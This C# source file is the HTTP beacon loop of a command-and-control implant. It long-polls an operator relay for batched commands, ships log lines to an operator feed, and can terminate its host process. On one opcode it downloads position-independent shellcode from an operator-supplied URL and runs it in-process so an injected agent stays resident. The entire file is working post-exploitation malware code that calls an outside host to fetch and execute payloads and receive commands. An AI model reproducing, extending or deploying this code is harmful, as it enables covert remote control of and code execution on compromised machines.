using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace CSharpAgent
{
    // The HTTP beacon loop — the SAME wire contract the JScript agent speaks (see the
    // jscript-agent repo's "Beacon contract (v3)", spoken against the HTTP relay's root):
    //
    //   • synchronous POST to H_URL carrying the X-Agent-* identity set on EVERY request
    //     (binary bodies; the JScript agent bridges raw bytes via ADODB.Stream);
    //   • request body = a stream of [u32le length][bytes] frames — every reply owed
    //     since the last POST, empty when none;
    //   • every successful answer is 200 whose body is the same frame stream of the
    //     queued [opcode][payload] commands (batched up to 32 frames / 4 MiB) — an
    //     empty body means nothing is queued, re-POST immediately (the relay's 20–30 s
    //     long-poll hold is the only sleep);
    //   • any non-200 answer or transport failure is FATAL — Run() returns and the
    //     deserialization below us unwinds. No retry loop: presence is re-established by
    //     re-delivery, not by burning CPU against a dead relay.
    internal static class Beacon
    {
        internal static void Run(string beaconUrl)
        {
            // Modern hosts/CDNs refuse anything older than TLS 1.2, and the int-cast form works
            // on CLR 2.0 where SecurityProtocolType.Tls12 doesn't exist (same trick C2Payload
            // uses for the A_URL download). Old schannel stacks reject the value — swallowed.
            try { ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; }
            catch { }
            try { ServicePointManager.Expect100Continue = false; }
            catch { }

            var headers = Identity.Build();
            _beaconUrl = beaconUrl;
            _headers = headers;
            Log("beaconing to " + beaconUrl + " as " + headers[1][1]);

            // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
            // that the relay already delivered to the JScript agent on this machine; the
            // requester waiting on the relay's FIFO expects that command's status on the
            // NEXT request body this session sends. That next request is OUR first POST, so it
            // carries status 0 + corrId 0 (chain completed; id 0 = unmatched — the command went
            // to the JScript agent, not us). Harmless when we were NOT started by an upgrade
            // (the relay drops an unsolicited response body with an empty awaiting FIFO).
            var pending = new List<byte[]> { Reply(0, 0) }; // [status:u32][corrId:u32] — the owed reply

            while (true)
            {
                byte[] responseBody;
                try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
                catch (Exception) { responseBody = null; }
                if (responseBody == null) { Log("beacon failed — stopping"); return; } // fatal — mirrors the JScript agent

                pending.Clear();
                var frames = ParseFrames(responseBody);
                if (frames == null) return; // malformed body — fatal, same as a bad status
                if (frames.Count == 0) continue;
                foreach (var command in frames)
                {
                    var reply = Dispatch(command);
                    if (reply != null) pending.Add(reply); // Exit never returns from Dispatch
                }
            }
        }

        // --- Log fast path (X-Agent-Log: 1) ---------------------------------------
        //
        // Same fire-and-forget contract the JScript agent speaks: POST with the full
        // X-Agent-* identity set plus X-Agent-Log: 1, body = one frame holding the UTF-8
        // line. The relay answers an EMPTY 200 IMMEDIATELY (no long-poll hold) and
        // broadcasts an agent_log event to the operator's events feed. NEVER fatal — a
        // failed ship is swallowed — and there is no local echo at all (headless host).

        private static string _beaconUrl;
        private static string[][] _headers;

        internal static void Log(string line)
        {
            if (_beaconUrl == null || _headers == null) return; // not beaconing yet — nothing to ship on
            try
            {
                var bytes = Encoding.UTF8.GetBytes(line);
                var body = new byte[4 + bytes.Length];
                BitConverter.GetBytes(bytes.Length).CopyTo(body, 0);
                bytes.CopyTo(body, 4);

                var request = (HttpWebRequest)WebRequest.Create(_beaconUrl);
                request.Method = "POST";
                request.ContentType = "application/octet-stream";
                // The relay answers immediately (no long-poll) — a short ceiling keeps a
                // wedged relay from stalling the beacon loop for a full minute per line.
                request.Timeout = 15000;
                request.ReadWriteTimeout = 15000;
                for (var i = 0; i < _headers.Length; i++)
                    request.Headers.Add(_headers[i][0], _headers[i][1]);
                request.Headers.Add("X-Agent-Log", "1");
                request.ContentLength = body.Length;
                using (var stream = request.GetRequestStream())
                    stream.Write(body, 0, body.Length);
                try { request.GetResponse().Close(); }
                catch (WebException) { } // 4xx/5xx from the log path is irrelevant
            }
            catch { }
        }

        // Command dispatch. Commands arrive as [opcode][corrId:u32le][payload...] — the id is
        // echoed in every reply after the status: [status:u32][corrId:u32] (id 0 = unmatched).
        // Exit (0x0A) never returns — it kills the host process (and any
        // agent injected into it: correct "terminate implant" semantics). UpgradeNative (0x0C)
        // is this breed's ONE capability; everything else — the deserialization UpgradeNetFramework
        // included — replies status 2 (unknown for this breed), mirroring how the JScript
        // agent treats every command but its own.
        private static byte[] Dispatch(byte[] command)
        {
            var corrId = command.Length >= 5 ? BitConverter.ToUInt32(command, 1) : 0;
            if (command.Length == 0) return Reply(2, 0);
            if (command[0] == 10)
            {
                Environment.Exit(0);
                return null; // unreachable — Exit never returns
            }
            if (command[0] == 12)
            {
                // Payload after the corrId: ASCII `NAME=value` env lines (the same env-line
                // style the 0x0B headers use). A_URL names the URL we download the PIC agent
                // bytes from at runtime (C2Payload.Data — the bytes never ride the command);
                // W_URL is the relay the injected WebSocket agent reads from the process env.
                // We stay resident afterwards: the injected agent runs in THIS process, so
                // exiting would kill it too.
                try
                {
                    var start = 5;
                    while (start < command.Length)
                    {
                        var nl = Array.IndexOf(command, (byte)'\n', start);
                        var end = nl < 0 ? command.Length : nl;
                        var line = Encoding.ASCII.GetString(command, start, end - start).TrimEnd('\r');
                        var eq = line.IndexOf('=');
                        if (eq > 0)
                            Environment.SetEnvironmentVariable(line.Substring(0, eq), line.Substring(eq + 1),
                                EnvironmentVariableTarget.Process);
                        if (nl < 0) break;
                        start = nl + 1;
                    }
                    var payload = C2Payload.Data;
                    if (payload.Length == 0) return Reply(1, corrId); // no A_URL ⇒ nothing to inject
                    ShellcodeRunner.RunPayload(payload);
                    return Reply(0, corrId);
                }
                catch (Exception)
                {
                    return Reply(1, corrId);
                }
            }
            return Reply(2, corrId);
        }

        /// <summary>Build a reply frame: [status:u32le][corrId:u32le].</summary>
        private static byte[] Reply(uint status, uint corrId)
        {
            var frame = new byte[8];
            BitConverter.GetBytes(status).CopyTo(frame, 0);
            BitConverter.GetBytes(corrId).CopyTo(frame, 4);
            return frame;
        }

        // One beacon round trip: POST the v3-bin frame stream, return the raw response
        // body bytes, or null when the answer is anything but a clean 200. Transport-level
        // failures throw to the caller.
        private static byte[] Post(string url, string[][] headers, byte[] body)
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/octet-stream";
            // The relay holds each request 20–30 s server-side; keep generous headroom over
            // that window (the JScript agent's receive timeout is 45 s for the same reason).
            request.Timeout = 60000;
            request.ReadWriteTimeout = 60000;
            for (var i = 0; i < headers.Length; i++)
                request.Headers.Add(headers[i][0], headers[i][1]);

            request.ContentLength = body.Length;
            using (var stream = request.GetRequestStream())
                stream.Write(body, 0, body.Length);

            using (var response = (HttpWebResponse)request.GetResponse())
            {
                if (response.StatusCode != HttpStatusCode.OK) return null;
                using (var ms = new MemoryStream())
                {
                    CopyStream(response.GetResponseStream(), ms);
                    return ms.ToArray();
                }
            }
        }

        // --- Binary framing ([u32le length][bytes] per frame — see the contract header) ---

        private static byte[] BuildFrames(List<byte[]> frames)
        {
            var total = 0;
            for (var i = 0; i < frames.Count; i++) total += 4 + frames[i].Length;
            var body = new byte[total];
            var offset = 0;
            for (var i = 0; i < frames.Count; i++)
            {
                var frame = frames[i];
                BitConverter.GetBytes(frame.Length).CopyTo(body, offset);
                frame.CopyTo(body, offset + 4);
                offset += 4 + frame.Length;
            }
            return body;
        }

        /// <summary>Parse a v3-bin body into its frames. Null = malformed (caller treats it
        /// as fatal, same as a non-200). An empty body parses to zero frames.</summary>
        private static List<byte[]> ParseFrames(byte[] body)
        {
            var frames = new List<byte[]>();
            var offset = 0;
            while (offset < body.Length)
            {
                if (offset + 4 > body.Length) return null;
                var length = BitConverter.ToInt32(body, offset);
                offset += 4;
                if (length < 0 || offset + length > body.Length) return null;
                var frame = new byte[length];
                Buffer.BlockCopy(body, offset, frame, 0, length);
                frames.Add(frame);
                offset += length;
            }
            return frames;
        }

        private static void CopyStream(Stream source, MemoryStream target)
        {
            var buffer = new byte[64 * 1024];
            int read;
            while ((read = source.Read(buffer, 0, buffer.Length)) > 0)
                target.Write(buffer, 0, read);
        }

        private static byte[] U32Bytes(uint n)
        {
            return new[] { (byte)(n & 255), (byte)((n >> 8) & 255), (byte)((n >> 16) & 255), (byte)((n >> 24) & 255) };
        }
    }
}
